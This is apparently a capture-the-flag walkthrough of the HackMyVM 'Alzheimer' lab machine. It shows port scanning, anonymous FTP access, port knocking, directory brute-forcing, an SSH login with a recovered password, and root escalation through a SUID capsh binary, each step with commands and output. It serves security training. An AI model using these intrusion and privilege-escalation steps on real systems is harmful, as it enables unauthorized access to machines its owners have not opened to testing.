# Alzheimer

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.24          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-21 16:22 +07
Nmap scan report for 10.11.5.24
Host is up (0.00074s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp open     ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.5.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp filtered ssh
80/tcp filtered http
MAC Address: 08:00:27:71:35:F7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.95 seconds
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sU -F --top-ports 100 10.11.5.24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-21 16:22 +07
Nmap scan report for 10.11.5.24
Host is up (0.0022s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
MAC Address: 08:00:27:71:35:F7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 111.32 seconds
```

#### FTP
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ftp 10.11.5.24        
Connected to 10.11.5.24.
220 (vsFTPd 3.0.3)
Name (10.11.5.24:dungcngo): anonymous 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||42526|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
-rw-r--r--    1 0        0              70 Oct 03  2020 .secretnote.txt
226 Directory send OK.
ftp> get .secretnote.txt
local: .secretnote.txt remote: .secretnote.txt
229 Entering Extended Passive Mode (|||18288|)
150 Opening BINARY mode data connection for .secretnote.txt (70 bytes).
100% |*****************************************|    70       57.34 KiB/s    00:00 ETA
226 Transfer complete.
70 bytes received in 00:00 (14.38 KiB/s)
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat .secretnote.txt 
I need to knock this ports and 
one door will be open!
1000
2000
3000

┌──(dungcngo㉿kali)-[/tmp]
└─$ knock -v 10.11.5.24 1000 2000 3000
hitting tcp 10.11.5.24:1000
hitting tcp 10.11.5.24:2000
hitting tcp 10.11.5.24:3000
                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -p 22,80 10.11.5.24              
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-21 16:32 +07
Nmap scan report for 10.11.5.24
Host is up (0.0011s latency).

PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp open     http
MAC Address: 08:00:27:71:35:F7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

#### Web
![web](/walkthroughs/hackmyvm/machines/beginner/Alzheimer/web.png)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl http://10.11.5.24             
I dont remember where I stored my password :(
I only remember that was into a .txt file...
-medusa

<!---. --- - .... .. -. --. -->
```

`medusa`'s password is stored in `.txt` file.
#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.24/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.24/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 301) [Size: 185] [--> http://10.11.5.24/home/]
/admin                (Status: 301) [Size: 185] [--> http://10.11.5.24/admin/]
/secret               (Status: 301) [Size: 185] [--> http://10.11.5.24/secret/]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -s "http://10.11.5.24/home/"            
Maybe my pass is at home!
-medusa
                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -s "http://10.11.5.24/admin/"
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.14.2</center>
</body>
</html>
                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -s "http://10.11.5.24/secret/"
Maybe my password is in this secret folder?
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.24/secret/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak                                                
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.24/secret/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              bak,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 301) [Size: 185] [--> http://10.11.5.24/secret/home/]
/index.html           (Status: 200) [Size: 44]
Progress: 18452 / 18452 (100.00%)
===============================================================
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -s "http://10.11.5.24/secret/home/"
Im trying a lot. Im sure that i will recover my pass!
-medusa
```


### Initial Access
#### FTP
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ftp 10.11.5.24
Connected to 10.11.5.24.
220 (vsFTPd 3.0.3)
Name (10.11.5.24:dungcngo): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||9856|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
-rw-r--r--    1 0        0              93 May 21 05:31 .secretnote.txt
226 Directory send OK.
ftp> get .secretnote.txt
local: .secretnote.txt remote: .secretnote.txt
229 Entering Extended Passive Mode (|||26910|)
150 Opening BINARY mode data connection for .secretnote.txt (93 bytes).
100% |*****************************************|    93       48.07 KiB/s    00:00 ETA
226 Transfer complete.
93 bytes received in 00:00 (14.90 KiB/s)
```
We see different size of file `.secretnote.txt` (70 vs 93).

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat .secretnote.txt   
I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
```
We have `medusa`'s password is `Ihavebeenalwayshere!!!`
#### SSH
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh medusa@10.11.5.24        
The authenticity of host '10.11.5.24 (10.11.5.24)' can't be established.
ED25519 key fingerprint is: SHA256:O2S8HAtlJxSTJJgIQUiIzsbSKX/qj9Thyn38JM6wsBY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.11.5.24' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
medusa@10.11.5.24's password: 
Linux alzheimer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Oct  3 06:00:36 2020 from 192.168.1.58
medusa@alzheimer:~$ id ; hostname
uid=1000(medusa) gid=1000(medusa) groups=1000(medusa),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
alzheimer
```

#### Flags (user.txt)
```bash
medusa@alzheimer:~$ ls
user.txt
medusa@alzheimer:~$ cat user.txt 
HMVrespectmemories
```

### Privilege Escalation
#### Enumeration
```bash
medusa@alzheimer:~$ sudo -l
Matching Defaults entries for medusa on alzheimer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User medusa may run the following commands on alzheimer:
    (ALL) NOPASSWD: /bin/id
```
```bash
medusa@alzheimer:~$ find / -perm -4000 -exec ls -la {} \; 2>/dev/null 
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-sr-x 1 root root 26776 Feb  6  2019 /usr/sbin/capsh
```
`/usr/sbin/capsh` - note

#### Abuse
![capsh](/walkthroughs/hackmyvm/machines/beginner/Alzheimer/capsh.png)

```bash
medusa@alzheimer:~$ /usr/sbin/capsh --gid=0 --uid=0 --
root@alzheimer:~# id;hostname
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(medusa)
alzheimer
```

#### Flags (root.txt)
```bash
root@alzheimer:~# cd /root/
root@alzheimer:/root# ls
root.txt
root@alzheimer:/root# cat root.txt 
HMVlovememories
```

***You are welcome!***
